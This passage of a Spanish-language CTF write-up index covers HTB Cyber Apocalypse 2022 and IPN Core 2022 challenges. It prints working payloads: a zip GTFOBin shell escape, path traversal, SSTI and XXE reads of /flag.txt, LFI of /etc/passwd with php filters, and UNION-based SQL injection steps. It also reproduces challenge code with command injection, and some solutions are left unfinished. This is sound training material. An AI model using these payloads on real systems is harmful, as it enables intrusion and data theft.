XSS","IDOR","RCE (md-to-pdf)","Binary Analysis (IDA)","Microsoft Windows Event Logs Analysis (evtx)+","NTUSER.dat Analysis","GTFOBins (zip)"]},{"location":"CTFs/HTB%20Cyber%20Apocalypse%202022/#stats_6","title":"Stats","text":"Attribute Info Difficulty easy Description Ramona's obsession with modifications and the addition of artifacts to her body has slowed her down and made her fail and almost get killed in many missions. For this reason, she decided to hack a tiny robot under Golden Fang's ownership called \"Compressor\", which can reduce and increase the volume of any object to minimize/maximize it according to the needs of the mission. With this item, she will be able to carry any spare part she needs without adding extra weight to her back, making her fast. Can you help her take it and hack it? File -","tags":["Stored XSS","IDOR","RCE (md-to-pdf)","Binary Analysis (IDA)","Microsoft Windows Event Logs Analysis (evtx)+","NTUSER.dat Analysis","GTFOBins (zip)"]},{"location":"CTFs/HTB%20Cyber%20Apocalypse%202022/#solucion_6","title":"Soluci\u00f3n","text":"<p>Para este reto se expon\u00eda una conexi\u00f3n a un host en donde se ofrec\u00edan diferentes opciones para interactuar con el binario disponible.</p> <p>De acuerdo a la interacci\u00f3n se encontraron 2 formas de resolver el reto, mediante un Path traversal haciendo uso de la ejecuci\u00f3n de <code>cat</code> disponible.</p> <pre><code>\u2514\u2500$ nc 138.68.183.64 31076\n\n[*] Directory to work in: tHV1tdX82QcPllglF8wa6AhU24FRZS4S\n\nComponent List:\n\n+===============+\n|               |\n|  1. Head  \ud83e\udd16  |\n|  2. Torso \ud83e\uddb4   |\n|  3. Hands \ud83d\udcaa  |\n|  4. Legs  \ud83e\uddb5   |\n|               |\n+===============+\n\n[*] Choose component: 1\n\n[*] Sub-directory to work in: tHV1tdX82QcPllglF8wa6AhU24FRZS4S/Head\n\n\nActions:\n\n1. Create artifact\n2. List directory    (pwd; ls -la)\n3. Read artifact     (cat ./&lt;name&gt;)\n4. Compress artifact (zip &lt;name&gt;.zip &lt;name&gt; &lt;options&gt;)\n5. Change directory  (cd &lt;dirname&gt;)\n6. Clean directory   (rm -rf ./*)\n7. Exit\n\n[*] Choose action: 3\n\n\nInsert name you want to read: ../../flag.txt\nHTB{GTFO_4nd_m4k3_th3_b35t_4rt1f4ct5}\n</code></pre> <p>Y tambi\u00e9n por medio de la utilidad expuesta de <code>zip</code> se encuentra un GTFOBin el cu\u00e1l permite la invocaci\u00f3n de una shell.</p> <pre><code>Actions:\n\n1. Create artifact\n2. List directory    (pwd; ls -la)\n3. Read artifact     (cat ./&lt;name&gt;)\n4. Compress artifact (zip &lt;name&gt;.zip &lt;name&gt; &lt;options&gt;)\n5. Change directory  (cd &lt;dirname&gt;)\n6. Clean directory   (rm -rf ./*)\n7. Exit\n\n[*] Choose action: 4\n\n\nInsert &lt;name&gt;.zip:\nInsert &lt;name&gt;: /etc/passwd\nInsert &lt;options&gt;: -T -TT 'sh #'\n  adding: etc/passwd (deflated 62%)\nls -la\ntotal 12\ndrwxr-sr-x    2 ctf      ctf           4096 May 18 23:01 .\ndrwxr-sr-x    6 ctf      ctf           4096 May 18 23:00 ..\n-rw-------    1 ctf      ctf            650 May 18 23:01 zikfJpfK\ncd ..\nls -la\ntotal 24\ndrwxr-sr-x    6 ctf      ctf           4096 May 18 23:00 .\ndrwxr-sr-x    1 ctf      ctf           4096 May 18 23:00 ..\ndrwxr-sr-x    2 ctf      ctf           4096 May 18 23:00 Hands\ndrwxr-sr-x    2 ctf      ctf           4096 May 18 23:01 Head\ndrwxr-sr-x    2 ctf      ctf           4096 May 18 23:00 Legs\ndrwxr-sr-x    2 ctf      ctf           4096 May 18 23:00 Torso\ncd ..\nls -la\ntotal 44\ndrwxr-sr-x    1 ctf      ctf           4096 May 18 23:00 .\ndrwxr-xr-x    1 root     root          4096 Mar  3 15:18 ..\ndrwxr-sr-x    6 ctf      ctf           4096 May 18 22:57 5pSXN8iJRdGc7Y8nk5oNcKcrJKFTPK21\n-rwxrwxr-x    1 root     root          3166 May 12 23:51 artifacts.py\n-rw-rw-r--    1 root     root           263 May 12 23:32 clear.py\n-rw-rw-r--    1 root     root            38 May 12 17:37 flag.txt\ndrwxr-sr-x    6 ctf      ctf           4096 May 18 22:55 kPeKQsYEx9Z6ZKkBrdtWmQKdS98CURJl\ndrwxr-sr-x    6 ctf      ctf           4096 May 18 22:54 kWHPODHQFKSletaDKHB2AgJslbm6fwbb\ndrwxr-sr-x    6 ctf      ctf           4096 May 18 23:00 tHV1tdX82QcPllglF8wa6AhU24FRZS4S\ndrwxr-sr-x    6 ctf      ctf           4096 May 18 22:55 wqVpR4QLSsuu5QiWRqhPNLuYh2aHzlaI\n</code></pre> <p>FLAG: HTB{GTFO_4nd_m4k3_th3_b35t_4rt1f4ct5}</p>","tags":["Stored XSS","IDOR","RCE (md-to-pdf)","Binary Analysis (IDA)","Microsoft Windows Event Logs Analysis (evtx)+","NTUSER.dat Analysis","GTFOBins (zip)"]},{"location":"CTFs/HTB%20Cyber%20Apocalypse%202022/#composicion","title":"Composici\u00f3n","text":"<p>Como parte del ejercicio \"post-reto\" se extrajo el c\u00f3digo correspondiente al reto (<code>artifacts.py</code> y clear.py).</p> artifacts.py<pre><code>#!/usr/bin/python3\nimport os, random\nfrom termcolor import colored\n\n\nwhitelist = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_.'#/ \"\nPATH = \"./\"\nsub_array = [\"Head\", \"Torso\", \"Hands\", \"Legs\"]\n\n# Create random directory\ndef rand_dirname(length=32):\n    charset = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n    dirname = \"\"\n    while len(dirname) &lt; length:\n        dirname += random.choice(charset)\n    return dirname\n\ndef check_filename(filename):\n    return all(i in whitelist for i in filename)\n\ndef change_sub_dir(idx, color):\n  print(colored(f\"\\n[*] Sub-directory to work in: {dirname}/{sub_array[idx]}\\n\", color))\n  os.chdir(PATH + sub_array[idx])\n\ndef subjects():\n  subs = \"\"\"\\nComponent List:\n\n+===============+\n|               |\n|  1. Head  \ud83e\udd16  |\n|  2. Torso \ud83e\uddb4   |\n|  3. Hands \ud83d\udcaa  |\n|  4. Legs  \ud83e\uddb5   |\n|               |\n+===============+\n  \"\"\"\n  print(colored(subs, \"magenta\"))\n  ans = int(input(colored(\"[*] Choose component: \", \"magenta\")))\n\n  if ans == 1:\n    change_sub_dir(0, \"blue\")\n  elif ans == 2:\n    change_sub_dir(1, \"green\")\n  elif ans == 3:\n    change_sub_dir(2, \"cyan\")\n  elif ans == 4:\n    change_sub_dir(3, \"yellow\")\n  else:\n    print(colored(\"\\n[-] Invalid option!\\n\", \"red\"))\n    exit()\n\ndef menu():\n  m = \"\"\"\nActions:\n\n1. Create artifact\n2. List directory    (pwd; ls -la)\n3. Read artifact     (cat ./&lt;name&gt;)\n4. Compress artifact (zip &lt;name&gt;.zip &lt;name&gt; &lt;options&gt;)\n5. Change directory  (cd &lt;dirname&gt;)\n6. Clean directory   (rm -rf ./*)\n7. Exit\n  \"\"\"\n  print(colored(m, \"yellow\"))\n  return int(input(colored(\"[*] Choose action: \", \"yellow\")))\n\ndef create_file():\n  fname = input(colored(\"Insert name: \", \"yellow\")).strip()\n  if not check_filename(fname):\n    print(colored(\"\\n[-] Invalid name!\\n\", \"red\"))\n    exit()\n  os.system(f\"touch {fname}\")\n  contents = input(colored(\"\\nInsert content: \", \"yellow\"))\n  f = open(fname, \"a\")\n  f.write(contents)\n  f.close()\n  print(\"\\n\")\n  print(colored(f\"[+] Artifact [{fname}] was created successfuly!\", \"green\"))\n\ndef zip():\n  zip_name = input(colored(\"Insert &lt;name&gt;.zip: \", \"blue\")).strip()\n  files    = input(colored(\"Insert &lt;name&gt;: \", \"blue\")).strip()\n  options  = input(colored(\"Insert &lt;options&gt;: \", \"blue\")).strip()\n  if not check_filename(zip_name) or not check_filename(files) or not check_filename(options):\n    print(colored(\"\\n[-] Invalid name!\\n\", \"red\"))\n    exit()\n  os.system(f\"zip {zip_name}.zip {files} {options}\")\n\n# Create directory\ndirname = rand_dirname()\nprint(colored(f\"\\n[*] Directory to work in: {dirname}\", \"cyan\"))\nos.mkdir(PATH + dirname)\nos.chdir(PATH + dirname)\nos.system(\"mkdir -p Head Torso Hands Legs\")\n\nans = subjects()\n\nwhile True:\n\n  # Choose action\n  act = menu()\n  print(\"\\n\")\n  if act == 1: \n    create_file()\n  elif act == 4:\n    zip()\n  elif act == 3: \n    fname = input(\"Insert name you want to read: \").strip()\n    os.system(f\"cat ./{fname}\")\n  elif act == 2: \n    os.system(\"pwd; ls -la\")\n  elif act == 6:\n    os.system(\"rm -rf ./*\")\n  elif act == 5: \n    os.chdir(f\"../../{dirname}\")\n    ans = subjects()\n  else:\n    print(colored(\"\\n[-] Invalid option!\\n\", \"red\"))\n    os.system(\"rm -rf ./*\")\n    exit()\n</code></pre> clear.py<pre><code>import os\n\nos.system('ls -la &gt; temp')\n\nf = open('temp', 'r')\nfor line in f:\n  arr = line.split()\n  try:\n    if len(arr[8]) &gt; 16:\n      os.system(f'rm -rf {arr[8]}') \n  except:\n    print('')\n\nprint(f'[+] Directories have been deleted!\\n')\nos.system('rm -f ./temp')\n</code></pre>","tags":["Stored XSS","IDOR","RCE (md-to-pdf)","Binary Analysis (IDA)","Microsoft Windows Event Logs Analysis (evtx)+","NTUSER.dat Analysis","GTFOBins (zip)"]},{"location":"CTFs/IPN%20Core%202022%20CTF/","title":"IPN Core 2022 CTF","text":""},{"location":"CTFs/IPN%20Core%202022%20CTF/#indice","title":"\u00cdndice","text":"<ul> <li>Resumen de vulnerabilidades</li> <li>Web</li> <li>Pentest web Parte 1</li> <li>Pentest web Parte 2</li> <li>Pentest web Parte 3</li> <li>CIC Blog</li> <li>Tacos Don Chano</li> <li>Crypto</li> <li>Encoding</li> <li>Esoteric0</li> <li>AESy</li> <li>RealBabyRSA</li> <li>Baby-FA</li> <li>Reversing</li> <li>T3SLA</li> <li>T3SLA - Parte 2</li> <li>T3SLA - Parte 3</li> <li>Pwning</li> <li>BabyPWN</li> <li>BabyPWN - Parte 2</li> <li>BabyPWN - Parte 3</li> <li>Misc</li> <li>Bot Calculadora</li> </ul>"},{"location":"CTFs/IPN%20Core%202022%20CTF/#resumen-de-vulnerabilidades","title":"Resumen de vulnerabilidades","text":"<ul> <li>SSRF</li> <li>SSTI</li> <li>XXE</li> <li>LFI + php filters</li> <li>SQLi</li> <li>AES CBC Bit Flipping</li> <li>RSA Common Modulus</li> </ul>"},{"location":"CTFs/IPN%20Core%202022%20CTF/#web","title":"Web","text":""},{"location":"CTFs/IPN%20Core%202022%20CTF/#pentest-web-parte-1","title":"Pentest web Parte 1","text":"<p>Info</p> Atributo Valor Descripci\u00f3n Uhmm no necesitas contexto... Archivos web_pentest_web_1.zip <p>Soluci\u00f3n</p> <p>Al interactuar con la p\u00e1gina web, se puede visualizar en el c\u00f3digo fuente un comentario que indica el lugar donde se encuentra ubicada la bandera.</p> <p></p> <p>Tomando en cuenta esto, se pudiera sospechar de alg\u00fan tipo de inclusi\u00f3n de archivos locales o algo por el estilo. Continuando con la interacci\u00f3n del sitio se puede visualizar una excepci\u00f3n del m\u00e9todo <code>fopen</code> de php el cu\u00e1l esta recibiendo el contenido del input disponible.</p> <p></p> <p>Si se busca en el manual de php acerca de la funci\u00f3n, se puede visualizar que esta recibir\u00e1 como par\u00e1metro una ruta de un directorio, por lo que si se emplea un archivo existente como <code>/flag.txt</code> se podr\u00e1 visualizar su contenido, realizando la petici\u00f3n con <code>curl</code> o a trav\u00e9s de alg\u00fan proxy como <code>BurpSuite</code>.</p> <p></p> <p>Flag: <code>CTF{9700cbd3cd4dc8c2010953ca1a029bd0}</code></p>"},{"location":"CTFs/IPN%20Core%202022%20CTF/#pentest-web-parte-2","title":"Pentest web Parte 2","text":"<p>Info</p> Atributo Valor Descripci\u00f3n Uhmm nop, no necesitas descripci\u00f3n... \u00bfo s\u00ed? Archivos web_pentest_web_2.zip <p>Soluci\u00f3n</p> <p>Se puede visualizar un input el cu\u00e1l al enviar/completar la petici\u00f3n se refleja nuestro contenido.</p> <p></p> <p>Al tratar de reconocer las tecnolog\u00edas que \"hostean\" el reto, se pudieron identificar por las cabeceras de las respuestas del servidor la versi\u00f3n de una librer\u00eda y versi\u00f3n de Python (<code>Werkzeug/2.2.2 Python/3.8.14</code>).</p> <p></p> <p>Al identificar esto, lo primero que pudiera llegarse a considerar es que el c\u00f3digo HTML este siendo pre-procesado por esta librer\u00eda de Python. En el proceso de ese pre-procesamiento se pueden encontrar vulnerabilidades de inyecci\u00f3n de plantillas (SSTI), por lo que al hacer uso de <code>{{7*7}}</code> en el campo de nombre se pudo validar que se trataba de esto en cuesti\u00f3n.</p> <p></p> <p>Utilizando el siguiente payload se pod\u00eda leer la bandera:</p> <pre><code>{{ request.__class__._load_form_data.__globals__.__builtins__.open(\"/flag.txt\").read() }}\n</code></pre> <p></p> <p>Flag: <code>CTF{d4bac92d0e15c50d3431043e27c62163}</code></p>"},{"location":"CTFs/IPN%20Core%202022%20CTF/#pentest-web-parte-3","title":"Pentest web Parte 3","text":"<p>Info</p> Atributo Valor Descripci\u00f3n Es divertido el pentest web desde Blackbox \u00bfno? :) Archivos web_pentest_web_3.zip <p>Soluci\u00f3n</p> <p>Al entrar en la web se visualizan dos enlaces en los cuales, en uno de ellos nos revela la ubicaci\u00f3n de la flag (<code>/flag</code>) y en el otro nos permite interactuar con un submit brind\u00e1ndonos una caja de texto en la que podamos mandar un saludo (<code>/rest</code>). Al mandar una prueba se puede visualizar una excepci\u00f3n relacionada con XML.</p> <p></p> <p>A lo que lleva a concluir de una vulnerabilidad de tipo XXE, al buscar y encontrar el siguiente payload:</p> <pre><code>&lt;!--?xml version=\"1.0\" ?--&gt;\n&lt;!DOCTYPE foo [&lt;!ENTITY example SYSTEM \"/flag.txt\"&gt; ]&gt;\n&lt;data&gt;&amp;example;&lt;/data&gt;\n</code></pre> <p>Se pudo obtener la bandera incluyendo el archivo y desplegando el archivo indicado.</p> <p></p> <p>Flag: <code>CTF{e4b50e71a8f7ec1f5c3b8db6a91ce2ff}</code></p>"},{"location":"CTFs/IPN%20Core%202022%20CTF/#cic-blog","title":"CIC Blog","text":"<p>Info</p> Atributo Valor Descripci\u00f3n \u00bfQu\u00e9 tal? Estoy por terminar mi blog y un colega de {|4_p4nd1||4_m4nt3q1||4}  me hizo favor de revisar el sitio, hab\u00eda encontrado algo pero a\u00fan no termina.  Mientras tanto me gustar\u00eda saber que encontr\u00f3, \u00bfme ayudas tambi\u00e9n a revisarlo? Archivos web_cic_blog.zip <p>Soluci\u00f3n</p> <p>Al buscar informaci\u00f3n dentro del c\u00f3digo fuente se puede visualizar un wrapper de contenido dentro de la barra lateral izquierda, indicando mediante el par\u00e1metro <code>page</code> la p\u00e1gina a cargar.</p> <p></p> <p>Al realizar una prueba para buscar incluir un archivo de sistema se puede visualizar su contenido <code>/wrapper.php?page=/etc/passwd</code>:</p> <p></p> <p>Posteriormente, al no encontrar la bandera dentro de la ra\u00edz del sistema (<code>/flag.txt</code> o algo similar), se busc\u00f3 fuzzear el sitio para ver si se encontraba informaci\u00f3n al respecto.</p> <pre><code>ffuf -c -ic -u \"http://192.168.111.153:8000/FUZZ\" -w /usr/share/wordlists/dirb/common.txt\n</code></pre> <p></p> <p>Encontrando as\u00ed varias entradas incluyendo <code>robots.txt</code>, la cual expon\u00eda mediante una regla de <code>Disallow</code> la ruta de la bandera.</p> <p></p> <p>Al incluir la ruta de la bandera se pod\u00eda procesar su contenido <code>/wrapper.php?page=/var/www/flag.php</code> mencionando como pista \"pensar en algo diferente\".</p> <p></p> <p>Dado que los archivos php son procesados del lado del servidor y no se puede visualizar su contenido, fue necesario usar un filtro de php para poder extraer su contenido real, mediante la petici\u00f3n:</p> <pre><code>/wrapper.php?page=php://filter/convert.base64-encode/resource=/var/www/flag.php\n</code></pre> <p>Extrayendo as\u00ed el contenido del archivo encodeado en base64, para despu\u00e9s desencodearlo y as\u00ed encontrar el valor de la bandera.</p> <p></p> <pre><code>echo \"PHN0eWxlPgogICAgLnBlcnJpbiB7CiAgICAgICAgdGV4dC1zaGFkb3c6IDJweCAycHggcmVkOwogICAgfQo8L3N0eWxlPgo8ZGl2IGNsYXNzPSJtYWluLXdyYXBwZXIiPgo8aDEgY2xhc3M9InBlcnJpbiI+QWggcGVycmluIGxlIHNhYmVzIGFsIExGSTwvaDE+CjxoMiBjbGFzcz0icGVycmluIj5ObyBjcmVhcyBxdWUgdmEgYSBzZXIgdGFuIGbDoWNpbCBvYnRlbmVyIHR1IGZsYWc8L2gyPgo8P3BocAogICRmbGFnID0gIkxQTXs0aF9wM3JyMW5fbGYxXzRfN2gzX3cxbn0iOwoJZWNobygiwr9ZYSBwZW5zYXN0ZSBlbiBhbGdvIGRpZmVyZW50ZT8iKTsKPz4KPC9kaXY+\" | base64 -d\n</code></pre> <p></p> <p>Flag: <code>LPM{4h_p3rr1n_lf1_4_7h3_w1n}</code></p>"},{"location":"CTFs/IPN%20Core%202022%20CTF/#tacos-don-chano","title":"Tacos Don Chano","text":"<p>Info</p> Atributo Valor Descripci\u00f3n Me hice la promesa de ya entrar a mis clases de desarrollo web y le hice a mi t\u00edo Chano un sitio para que que pueda gestionar sus \u00f3rdenes de tacos, pero de un momento a otro se ha estado comportando medio raro... y estoy teniendo errores inesperados, \u00bfqu\u00e9 crees que pueda estar mal? Archivos web_tacos_don_chano.zip <p>Soluci\u00f3n</p> <p>Se permite interactuar con el sitio mediante un input que en resumen manda una petici\u00f3n a <code>/orden.php?id=1</code> indicando el supuesto id de la orden de tacos, modificando el id se pueden visualizar todas las \u00f3rdenes disponibles en la plataforma la cu\u00e1l se puede sospechar que est\u00e1 interactuando con una base de datos.</p> <p>Enviando alg\u00fan caracter diferente a un n\u00famero (<code>/orden.php?id='</code>) se puede visualizar una excepci\u00f3n de SQL de la cu\u00e1l se expone la versi\u00f3n/tipo de base de datos (SQLite3), dando paso a sospechar que se trata de una inyecci\u00f3n SQL.</p> <p></p> <p>Por lo que se podr\u00eda automatizar el proceso con <code>sqlmap</code> o hacer a mano mediante:</p> <ol> <li>Identificaci\u00f3n de n\u00famero de columnas.</li> </ol> <pre><code>/orden.php?id=1 UNION SELECT 1,2,3-- -\n</code></pre> <p></p> <ol> <li>Identificaci\u00f3n de columnas que permitan caracteres.</li> </ol> <pre><code>/orden.php?id=1 UNION SELECT 'a','a','a'-- -\n</code></pre> <p></p> <ol> <li>Identificaci\u00f3n de tablas.</li> </ol> <pre><code>/orden.php?id=1 UNION SELECT (SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),'a','a'-- -\n\nY:\n\n/orden.php?id=1 UNION SELECT (SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 2 offset 1),'a','a'-- -\n\nPara identificar otras tablas.\n</code></pre> <p></p> <ol> <li>Identificaci\u00f3n de nombre de columnas en tabla identificada (opcional).</li> </ol> <pre><code>/orden.php?id=1 UNION SELECT (SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='flag'),'a','a'-- -\n</code></pre> <p></p> <ol> <li>Extracci\u00f3n de valores.</li> </ol> <pre><code>/orden.php?id=1 UNION SELECT (SELECT * FROM flag),'a','a'-- -\n</code></pre> <p></p> <p>Flag: <code>LPM{54l3n_2_d3_5u4p3rr0_p4r4_3l_j0v3n}</code></p>"},{"location":"CTFs/IPN%20Core%202022%20CTF/#crypto","title":"Crypto","text":""},{"location":"CTFs/IPN%20Core%202022%20CTF/#encoding","title":"Encoding","text":"<p>Info</p> Atributo Valor Descripci\u00f3n \u00bfQu\u00e9 tanto sabes de encoding? Archivos crypto_encoding.txt <p>Soluci\u00f3n</p> <p>Despu\u00e9s de pasar el texto obtenido a Cyberchef se obtuvo el resultado de la receta.</p> <p></p> <p>Flag: <code>LPM{3nc0ding_iS_b4sIc}</code></p>"},{"location":"CTFs/IPN%20Core%202022%20CTF/#esoteric0","title":"Esoteric0","text":"<p>Info</p> Atributo Valor Descripci\u00f3n \u00a1\u00a1Esto es del diablo!! \u00bfpuedes recuperar la flag? Archivos crypto_esoteric.txt <p>Soluci\u00f3n</p> <p>Despu\u00e9s de repasar el nombre y la descripci\u00f3n se pudo identificar que se trataba de un lenguaje de programaci\u00f3n esot\u00e9rico y partiendo directamente de la descripci\u00f3n va acorde a la descripci\u00f3n que se puede leer en el lenguaje Malbolge. Por lo que al usar un int\u00e9rprete de este lenguaje se puede obtener el valor de la bandera pegando el contenido proporcionado y ejecutando el programa.</p> <p></p> <p>Flag: <code>LPM{3Xel3ntE_C0noC3s_LaS_4rTes_0scUr4s}</code></p>"},{"location":"CTFs/IPN%20Core%202022%20CTF/#aesy","title":"AESy","text":"<p>Info</p> Atributo Valor Descripci\u00f3n \u00bfPodr\u00e1s romper la cookie y obtener acceso como admin? Archivos crypto_aesy_chall.py <p>Soluci\u00f3n</p> <p>Realizando un an\u00e1lisis al c\u00f3digo fuente se identific\u00f3 que al realizar el proceso de login se genera una cookie de sesi\u00f3n compuesta por 64 caracteres (en hexadecimal), de los cuales la mitad corresponde al <code>iv</code> que es utilizado en el proceso de cifrado y descifrado de la aplicaci\u00f3n. Y la otra mitad a lo cifrado del usuario seg\u00fan las siguientes l\u00edneas de c\u00f3digo:</p> <p></p> <ol> <li>M\u00e9todo de cifrado invocado.</li> <li>Retorno de valor <code>iv</code> + texto cifrado.</li> </ol> <p>Al buscar vulnerabilidades con el m\u00e9todo empleado de AES CBC se encontr\u00f3 el blog y el video en donde se explica la raz\u00f3n de la vulnerabilidad que parte de conocer los bytes correspondientes del <code>iv</code> y los bytes de lo cifrado.</p> <p>Dado que el proceso de AES CBC hace uso de XOR y se nos proporciona el resultado, en resumen bastar\u00eda en calcular el byte correspondiente de s\u00f3lo una de las letras dado que espera obtener <code>admin</code>. Extrayendo la cookie de sesi\u00f3n generada con <code>bdmin</code> por medio de <code>/login?username=bdmin</code> se obtiene <code>53456027e7f7e1022fa753f620aeac956f8b13fcc80f33b5a5b6feb140b2878f</code>.</p> <p></p> <pre><code>Cookie obtenida: 53456027e7f7e1022fa753f620aeac956f8b13fcc80f33b5a5b6feb140b2878f\n\nIV (cookie): 53456027e7f7e1022fa753f620aeac95\n\nCifrado (cookie): 6f8b13fcc80f33b5a5b6feb140b2878f\n</code></pre> <p>Tomando en cuenta el proceso que sigue AES CBC lo que se necesitar\u00eda ser\u00eda encontrar el valor del <code>iv</code> correspondiente para cambiar la <code>b</code> por <code>a</code> de <code>dmin</code> para ello se deber\u00eda seguir:</p> <pre><code>Primer byte correspondiente de IV: 53\nPrimer byte correspondiente de lo cifrado: 6f\nValor de b en hexadecimal: 62\n\n53 ^ (6f)? = 62\n\nPara encontrar el valor correspondiente de lo cifrado se realiza el siguiente XOR:\n\n53 ^ 62 = 31\n\nPor lo tanto se puede decir que:\n\n53 ^ 31 = 62\n\nConociendo este valor se puede buscar el varlo de IV que producir\u00eda a (61 en hexadecimal):\n\n? ^ 31 = 61\n\nDe acuerdo a las propiedades el XOR se podr\u00eda realizar la siguiente operaci\u00f3n para encontrar el segmento faltante:\n\n31 ^ 61 = ? (50)\n\nPor lo tanto se puede decir que:\n\n50 ^ 31 = 61\n</code></pre> <p>Tomando en cuenta lo anterior se podr\u00eda sustituir el primer byte del <code>iv</code> de la cookie por 50 para obtener as\u00ed la bandera.</p> <p></p> <p>Flag: <code>LPM{c0nOc3sl4||4v3_c13rt0?}</code></p>"},{"location":"CTFs/IPN%20Core%202022%20CTF/#realbabyrsa","title":"RealBabyRSA","text":"<p>Info</p> Atributo Valor Descripci\u00f3n RSA... \u00a1que com\u00fan! Archivos crypto_real_baby_rsa_output.txt crypto_real_baby_rsa_reto.py <p>Soluci\u00f3n</p> <p>Despu\u00e9s de visualizar el c\u00f3digo fuente y buscar un resumen de los ataques a RSA se puede percatar que ambos valores de la salida:</p> <pre><code>ct1=pow(FLAG,e1,n)\nct2=pow(FLAG,e2,n)\n</code></pre> <p>Estan usando el mismo m\u00f3dulo para las operaciones, por lo que al buscar dentro del resumen antes indicado se encontr\u00f3 este art\u00edculo en donde se detalla un escenario similar y explica en d\u00f3nde radica la vulnerabilidad, adem\u00e1s de brindar el c\u00f3digo fuente de la soluci\u00f3n. Por lo que al hacer uso del script se obtiene la bandera.</p> <p></p> <p>Flag: <code>LPM{P3rf3ctO!_c0N0c3s_Rs4_y_Sus_vuln3r4b1l1d4d3zzzz}</code></p>"},{"location":"CTFs/IPN%20Core%202022%20CTF/#baby-fa","title":"Baby-FA","text":"<p>Info</p> Atributo Valor Descripci\u00f3n \u00bfSeguir\u00e1s el camino f\u00e1cil?La flag es en min\u00fasculas Archivos crypto_baby_fa.txt <p>Soluci\u00f3n</p> <p>Al identificar el formato de la bandera al final del texto por deducci\u00f3n:</p> <pre><code>pkca: ksn{efliaetkag_hctekejcjag_ja_cfckegeg}\nflag: lpm{efliaetkag_hctekejcjag_ja_cfckegeg}\n</code></pre> <p>Se concluy\u00f3 que era alg\u00fan tipo de sustituci\u00f3n por lo que se utiliz\u00f3 esta receta de cyberchef.</p> <p></p> <p>Flag: <code>lpm{increibles_habilidades_de_analisis}</code></p>"},{"location":"CTFs/IPN%20Core%202022%20CTF/#reversing","title":"Reversing","text":""},{"location":"CTFs/IPN%20Core%202022%20CTF/#t3sla","title":"T3SLA","text":"<p>Info</p> Atributo Valor Descripci\u00f3n Cadena fue de visita a la ESCOM en su nuevo Tsl4. Pero olvid\u00f3 sus llaves en el laboratorio de redes y estar\u00e1 cerrado hasta ma\u00f1ana por el paro :( . Por suerte tu eres su amigo y le ayudar\u00e1s a abrir el auto. Lo primero ser\u00e1 revisar el firmware buscando la funci\u00f3n encargada de validar la llave. Archivos reversing_t3sla_chall <p>Soluci\u00f3n</p> <p>Al pasar el binario por ghidra y ver la funci\u00f3n indicada (<code>chequeo</code>) se pueden visualizar m\u00faltiples variables con valores hexadecimales, al convertir los valores se puede extraer la bandera, considerando que la distribuci\u00f3n de los valores se encuentra en little-endian:</p> <p></p> <p></p> <p>Flag: <code>flag{Fl4G_0cULtA-R3vErS1n}</code></p>"},{"location":"CTFs/IPN%20Core%202022%20CTF/#t3sla-parte-2","title":"T3SLA - Parte 2","text":"<p>Info</p> Atributo Valor Descripci\u00f3n Cuando la llave se comunica con el auto lo primero que hace es enviar una clave de 4 d\u00edgitos (que llegan a la funci\u00f3n de chequeo como los primeros 4 par\u00e1metros).  \u00bfCu\u00e1les son esos 4 d\u00edgitos correctos?  La flag es: flag{EncontrasteMiPin=PIN} Reemplazando PIN por los 4 d\u00edgitos correctos.  NOTA: Para este reto deber\u00e1s utilizar los mismo archivos del reto T3SLA Archivos - <p>Soluci\u00f3n</p> <p>Posteriormente en la misma funci\u00f3n de <code>chequeo</code> se verifican el PIN 1 a 1 respecto los argumentos recibidos, completando as\u00ed el PIN que se verifica.</p> <p></p> <p>Flag: <code>flag{EncontrasteMiPin=7395}</code></p>"},{"location":"CTFs/IPN%20Core%202022%20CTF/#t3sla-parte-3","title":"T3SLA - Parte 3","text":"<p>Info</p> Atributo Valor Descripci\u00f3n Ahora que conocemos el PIN, lo \u00fanico que nos resta para poder abrir el auto es conocer el password que se env\u00eda junto a la clave de 4 d\u00edgitos. Esta password la lee la misma funci\u00f3n de chequeo. La flag es la password.  ej.  flag{PASSWORD}  NOTA: Para este reto deber\u00e1s utilizar los mismo archivos del reto T3SLA Archivos - <p>Soluci\u00f3n</p> <p>D\u00e1ndole seguimiento al c\u00f3digo fuente obtenido, se puede ver que:</p> <ol> <li>Se realiza una validaci\u00f3n respeto al tama\u00f1o de la variable donde ser\u00e1 almacenada la contrase\u00f1a, validando que sea de 28 caracteres (0x1c).</li> <li>Del valor que se pone se realiza un XOR de cada uno de sus elementos.</li> <li>Se realiza otra validaci\u00f3n en memoria si</li> </ol> <p>Flag: <code>flag{}</code></p>"},{"location":"CTFs/IPN%20Core%202022%20CTF/#pwning","title":"Pwning","text":""},{"location":"CTFs/IPN%20Core%202022%20CTF/#babypwn","title":"BabyPWN","text":"<p>Info</p> Atributo Valor Descripci\u00f3n Este es otro reto de PWN m\u00e1s, pero no te apures te estar\u00e9 guiando :)  El primer paso para conseguir RCE es buscar alg\u00fan bug de corrupci\u00f3n de memoria que nos permita tomar control del flujo de ejecuci\u00f3n.  \u00a1Suerte! Archivos pwn_babypwn_chall pwn_babypwn_chall.c <p>Soluci\u00f3n</p>"},{"location":"CTFs/IPN%20Core%202022%20CTF/#babypwn-parte-2","title":"BabyPWN - Parte 2","text":"<p>Info</p> Atributo Valor Descripci\u00f3n Para mala suerte la funci\u00f3n cuenta con un mecanismo de seguridad conocido como stack canary que es una variable en la pila con un valor que si se modifica entonces el programa sabe que esta bajo un posible ataque. La buena noticia es que este stack canary tiene siempre el mismo valor.  Esta vez, cuando hagas el overflow aseg\u00farate de escribir sobre el stack canary el valor correcto.  NOTA: Para este reto deber\u00e1s utilizar los mismo archivos del reto BabyPWN Archivos - <p>Soluci\u00f3n</p>"},{"location":"CTFs/IPN%20Core%202022%20CTF/#babypwn-parte-3","title":"BabyPWN - Parte 3","text":"<p>Info</p> Atributo Valor Descripci\u00f3n Como \u00faltimo paso necesitamos controlar ese flujo de ejecuci\u00f3n;  por suerte, el programa imprime la cadena que le dimos usando la funci\u00f3n system y como par\u00e1metro le pasa una cadena que almacena... \u00a1\u00a1\u00a1EN LA PILA!!!,  por lo que con nuestro overflow podremos modificar ese argumento para ejecutar system con lo que nosotros queramos \u00a1Suerte! :)  NOTA: Para este reto deber\u00e1s utilizar los mismo archivos del reto BabyPWN Archivos - 